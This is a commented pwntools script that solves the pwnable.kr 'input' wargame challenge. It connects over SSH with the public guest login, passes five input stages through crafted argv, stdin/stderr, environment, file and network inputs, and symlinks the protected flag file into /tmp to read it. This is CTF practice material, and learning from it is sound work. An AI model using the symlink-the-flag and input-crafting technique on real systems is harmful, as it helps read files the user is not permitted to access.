from pwn import *

session = ssh('input2', 'pwnable.kr', port=2222, password='guest')

# Stage 1
# First thing, it wants argc to be 100
argv = ["A" for i in range(100)]
# Next, it wants argv['A'] to be NUL
argv[ord('A')] = "\x00"
# And argv['B'] to be " \n\r"
argv[ord('B')] = "\x20\x0a\x0d"

# Stage 2 will be taken care of by dup()ing stdin on stderr. This will have
# the nice effect of just writing to the standard input of the process to
# pass both the read(0, buf, 4) AND the read(2, buf, 4) since 2 is stderr.
# pwntools makes this a breeze in the call to process() below. Set the stream
# to an int to use file descriptors, or give a string to use file I/O for
# that stream.

# Stage 3 is straight-forward.
env = {}
env[b"\xde\xad\xbe\xef"] = b"\xca\xfe\xba\xbe"

# Stage 4
# This gets a bit cumbersome. We don't have write permission in the home for
# this user. Let's create a writable directory for this stage.
session.process(['/bin/mkdir', '/tmp/jaysmith'])

# Next, I'm super lazy. Since it's expecting to read zeros from this file
# named "\x0a", I'm just going to create a symlink to /dev/zero with the
# appropriate name.
session.process(['/bin/ln', '-s', '/dev/zero', '/tmp/jaysmith/\x0a'])

# Finally for stage 4, when we win our cwd will not have a flag file. Let's
# make one last symlink.
session.process(['/bin/ln', '-s', '/home/input2/flag', '/tmp/jaysmith/flag'])

# Stage 5 is also pretty straight-forward. We give a network port in argv['C']
# and netcat to it later.
argv[ord('C')] = "4444"

# Start the challenge binary with all the needed args we set up...
io = session.process(argv, '/home/input2/input', cwd='/tmp/jaysmith', env=env, stderr=0)

# Send the data to beat stage 2. First, it's goin to read from stdin.
io.send(b'\x00\x0a\x00\xff')

# Next, it's going to read from fd 2, which is stderr. We took care of that
# when we dup()ed stdin (0) and pointed fd 2 at it.
io.send(b'\x00\x0a\x02\xff')

# Stages 3 and 4 will pass automatically as a result of the earlier setup.

# Stage 5 is simply connecting to the network listener we helped configure
# earlier. It's expecting deadbeef. We sleep briefly since the listener takes
# a little bit to start accepting connections. Connecting too early will
# result in failure.
sleep(1)
r = remote('pwnable.kr', 4444)
r.send(b"\xde\xad\xbe\xef")

io.recvuntil('Stage 5 clear!\n')
print(io.recvline())
r.close()

# Finally, a bit of cleanup...
session.process(['/bin/rm', '-rf', '/tmp/jaysmith/'])
